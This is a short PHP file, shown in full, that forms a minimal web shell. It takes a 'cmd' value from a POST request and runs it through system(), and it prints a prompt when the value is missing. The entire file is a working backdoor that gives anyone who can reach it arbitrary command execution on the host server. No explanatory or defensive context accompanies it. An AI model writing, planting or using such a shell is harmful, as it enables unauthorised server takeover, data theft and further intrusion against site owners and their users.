<?php
    if(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    } else {
        echo "Use cmd argument!!!!";
    }
?>
